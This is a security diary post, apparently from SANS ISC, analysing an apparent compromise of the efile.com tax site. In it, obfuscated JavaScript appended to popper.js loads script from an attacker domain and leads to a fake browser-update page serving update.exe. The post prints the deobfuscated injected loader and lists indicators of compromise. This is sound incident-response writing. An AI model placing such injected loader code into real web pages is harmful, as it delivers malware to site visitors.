<div class="diarybody">
<p>[Added an update at the end with more details regarding the &quot;update.exe&quot; file. I think it is safe to say at this point, that efile.com has been compromised.]</p>

<p>Last week, related to the 3CX compromise, I mentioned how difficult it can be to determine if an overall trusted resource is compromised. This weekend, our reader Drew sent us a note that there is some talk about efile.com being possibly compromised. Users are reporting a popup that offers a file &quot;update.exe.&quot; This in itself is, of course, highly suspicious. But I was not able to reproduce the issue. Drew also linked to an any.run&nbsp;analysis showing the behavior [1].</p>

<p>The update.exe was apparently uploaded to Virustotal [2]. As I checked earlier today, only two engines flagged the file: Crowdstrike and Cynet. I just redid the analysis and did not get any additional positives. The file appears to have been uploaded on March 17th, and the creation time is March 17th as well. A post on Reddit also observed the behavior on March 17th [3]</p>

<p>Let&#39;s take a closer look at efile.com. The site uses&nbsp;common modern technologies: Bootstrap, jQuery, and Google Analytics [4]. Nothing too special about this. But things get a bit more interesting looking at the sources downloaded by the browser:</p>

<p><img alt="" src="https://isc.sans.edu/diaryimages/images/Screenshot%202023-04-03%20at%2011_55_51%20AM.png" style="width: 400px; height: 186px;" /></p>

<p>An empty response is received from&nbsp;https[:]//www[.]infoamanewonliag[.]online/update/index.php. The URL&#39;s &quot; update &quot; part matches the suspect binary&#39;s name that users reported (update.exe).</p>

<p>So why did the browser connect to&nbsp;infoamanewonliag[.]online?</p>

<p>It turns out that the request came from &quot;popper.js&quot;:</p>

<p><img alt="screen shot showing a snippet from popper.js " src="https://isc.sans.edu/diaryimages/images/Screenshot%202023-04-03%20at%2012_00_31%20PM.png" style="width: 400px; height: 227px;" /></p>

<p>The slightly obfuscated code becomes (line breaks added for readability):</p>

<blockquote>
<p><code>s=document.createElement(&#39;script&#39;);<br />
document.body.appendChild(s);<br />
s.src=&#39;//www.infoamanewonliag.online/update/index.php?&#39;+Math.random();</code></p>
</blockquote>

<p>The use of&nbsp;obfuscated code is indeed very odd. The remaining content of popper.js matches a standard bootstrap addon to display popup dialogs [5]. Someone took the normal and harmless popper.js and added obfuscated JavaScript to connect to&nbsp;infoamanewonliag[.]online.</p>

<p>What do we know about infoamanewonliag[.]online?</p>

<p>Whois shows that it was registered on March 12th and last updated on March 17th, the same day update.exe was created and uploaded to Virustotal. The hostname resolves to&nbsp;47.245.6.91. This IP address is hosted by Alibaba.</p>

<p>Compromised or not? I reached out to efile.com and am waiting for a response. Only they should be able to know for sure if this code is supposed to be on the site or not. Any other ideas to figure out what exactly is happening here?</p>

<p>[UPDATE Apr 3rd 1419PM EDST]</p>

<p>Colin Cowie on Mastodon (<a href="https://infosec.exchange/@th3_protoCOL">@the_protoCOL@infosec.exchange</a>) noted that urlscan.io caught some of the update.exe redirects [6].</p>

<ol>
	<li>JavaScript redirects the user to a fake error page. The page looks very much like a legitimate browser error stating, &quot;The current version of your browser uses an unsupported protocol. Click on the below link to update your browser.&quot;</li>
	<li>Additional Javascript is loaded from&nbsp;?channel-platform.s3.ap-east-1[.]amazonaws[.]com/package/update[.]js. This javascript is used to display the fake page.</li>
	<li>update.exe uses a valid signature from &quot;Sichuan Niurui Science and Technology Co., Ltd.</li>
</ol>
